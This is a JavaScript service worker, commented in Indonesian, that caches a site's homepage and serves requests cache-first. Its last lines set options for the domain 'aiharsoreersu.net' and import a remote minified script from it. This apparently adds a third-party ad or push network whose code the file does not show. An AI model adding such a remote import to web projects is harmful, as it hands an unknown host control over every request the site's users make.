// Nama cache
const CACHE_NAME = 'flixora-cache-v1';

// Daftar file yang akan di-cache
const urlsToCache = [
  '/',
  '/index.html',
  // Tambahkan link ke file CSS dan JS utama Anda di sini jika ada
  // Contoh: '/style.css', '/script.js'
];

// Event saat Service Worker di-install
self.addEventListener('install', event => {
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then(cache => {
        console.log('Cache dibuka');
        return cache.addAll(urlsToCache);
      })
  );
});

// Event saat ada request ke jaringan
self.addEventListener('fetch', event => {
  event.respondWith(
    caches.match(event.request)
      .then(response => {
        // Jika request ada di cache, kembalikan dari cache
        if (response) {
          return response;
        }
        // Jika tidak, ambil dari jaringan
        return fetch(event.request);
      }
    )
  );
});


self.options = {
    "domain": "aiharsoreersu.net",
    "zoneId": 10002279
}
self.lary = ""
importScripts('https://aiharsoreersu.net/act/files/service-worker.min.js?r=sw')